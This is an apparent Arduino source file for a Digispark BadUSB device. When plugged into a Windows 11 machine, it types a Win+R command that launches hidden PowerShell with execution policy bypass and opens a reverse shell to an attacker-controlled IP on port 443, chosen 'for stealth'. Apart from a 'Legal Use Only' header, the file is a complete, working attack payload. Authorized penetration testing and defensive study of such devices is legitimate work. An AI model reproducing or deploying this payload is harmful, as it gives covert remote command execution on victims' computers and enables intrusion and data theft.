/*
 * Digispark BadUSB - Windows 11 Reverse Shell
 * Author: [anon12121]
 * Legal Use Only: For authorized penetration testing
 * Tested on: Windows 11 Pro 22H2
 */

#include "DigiKeyboard.h"

#define DELAY_SAFETY 5000    // 5-sec delay (prevents accidental execution)
#define YOUR_IP "10.10.14.5" // Kali/VPN IP
#define YOUR_PORT 443        // Use 443/53 for stealth

void setup() {
  DigiKeyboard.delay(DELAY_SAFETY);
  DigiKeyboard.sendKeyStroke(0);
  
  // Open hidden PowerShell (Windows 11 blocks WindowStyle Hidden, so we use -W Hidden)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Win+R
  DigiKeyboard.delay(500);
  
  // Obfuscated PowerShell reverse shell (Windows 11 compatible)
  DigiKeyboard.println("powershell -NoP -NonI -W Hidden -Exec Bypass \"$c=New-Object Net.Sockets.TCPClient('" YOUR_IP "'," YOUR_PORT ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$e=(iex $d 2>&1 | Out-String );$f=$e+'PS '+(pwd).Path+'> ';$g=([text.encoding]::ASCII).GetBytes($f);$s.Write($g,0,$g.Length);$s.Flush()};$c.Close()\"");
  
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}